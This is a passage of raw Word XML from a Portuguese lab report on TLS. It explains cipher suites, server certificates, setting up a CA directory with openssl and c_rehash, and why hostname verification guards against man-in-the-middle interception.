        <w:t xml:space="preserve">: Elliptic Curve Diffie-Hellman Ephemeral (troca de chaves) - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Algoritmo de assinatura - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>AES128-GCM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Cifra simétrica (Advanced Encryption Standard, 128 bits, Galois/Counter Mode) - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>SHA256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Função hash para integridade</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E4E008" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>2. Imprimir o certificado do servidor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E737B5B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">O certificado é obtido com </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ssock.getpeercert()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e contém: - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>subject</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Informação sobre o proprietário - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>issuer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: CA que emitiu o certificado - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>version</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Versão X.509 - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>notBefore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>notAfter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Validade temporal - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>subjectAltName</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: Nomes alternativos (SAN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5033D8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12E19A85" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">3. Propósito de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/etc/ssl/certs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F1AADE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Este diretório contém os certificados das </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Certificate Authorities (CAs) confiáveis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> do sistema. Durante o handshake TLS: 1. Servidor envia o certificado 2. Cliente verifica se foi assinado por uma CA em </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/etc/ssl/certs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3. Se válido, a conexão é estabelecida 4. Se inválido, conexão é rejeitada</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1934FC97" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Relação TCP/TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>sock.connect()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → Triggers TCP handshake - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>ssock.do_handshake()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → Triggers TLS handshake - TLS é uma camada </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sobre</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP (daí “Transport Layer Security”)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="20CADCBD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc213874704"/>
      <w:bookmarkStart w:id="34" w:name="task-1.b-certificado-da-ca"/>
      <w:bookmarkStart w:id="35" w:name="_Toc213881902"/>
      <w:r>
        <w:t>Task 1.b: Certificado da CA</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="2182F4C3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="problema"/>
      <w:r>
        <w:t>Problema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F495DC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ao usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>cadir = './client-certs'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (pasta vazia), o cliente </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>falha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> porque não encontra o certificado da CA para validar o servidor.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="3D25FB87" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="solução"/>
      <w:r>
        <w:t>Solução</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752F4561" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Identificar qual CA assinou o certificado:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31858430" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> x509 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> server.crt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-noout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-issuer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2CF948" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Copiar o certificado da CA:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6422CF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="FunctionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /etc/ssl/certs/DigiCert_Global_Root_CA.pem ./client-certs/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E984F5E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Compact"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Criar symbolic link com hash:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44299FC4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> x509 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> DigiCert_Global_Root_CA.pem </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-noout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-subject_hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t># Output: 3513523f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="FunctionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ln</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> DigiCert_Global_Root_CA.pem 3513523f.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE2FB26" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve">Ou usar </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>c_rehash</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC98539" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>c_rehash</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ./client-certs/</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="570899D2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0001FD63" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="por-que-o-hash"/>
      <w:r>
        <w:t>Por que o hash?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67626840" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">O OpenSSL procura certificados com o formato: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>&lt;hash&gt;.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>&lt;hash&gt;.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, etc. O hash é calculado do campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>subject</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> da CA, e isso permite lookup rápido.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="45463C50" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc213874705"/>
      <w:bookmarkStart w:id="40" w:name="task-1.c-hostname-check"/>
      <w:bookmarkStart w:id="41" w:name="_Toc213881903"/>
      <w:r>
        <w:t>Task 1.c: Hostname Check</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="3284A154" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Experiência</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252DEC4F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="experiência"/>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="6DCF4F8A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3D3C59A9" wp14:editId="4F487712">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5485769" cy="2209162"/>
            <wp:effectExtent l="0" t="0" r="631" b="638"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="1473212577"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5769" cy="2209162"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="452B4DDB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="importância-do-hostname-check"/>
      <w:r>
        <w:t>Importância do Hostname Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2956939E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Sem hostname verification</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, um atacante pode: 1. Obter certificado válido para </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>attacker.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2. Redirecionar tráfego de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>bank.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> para o próprio servidor 3. Apresentar certificado de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>attacker.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4. Cliente aceita (certificado válido, mas nome errado!) 5. Atacante intercepta comunicação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7969CBB1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Com hostname verification</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>, o cliente verifica se:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB84773" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Certificate CN/SAN == Hostname no URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A99F440" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Se não coincidir → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Rejeita conexão</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> → Protege contra MITM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="3F3BFD30" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc213874706"/>
      <w:bookmarkStart w:id="45" w:name="_Toc213881904"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Task 1.d: Enviar e Receber Dados</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="7B6CEE47" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
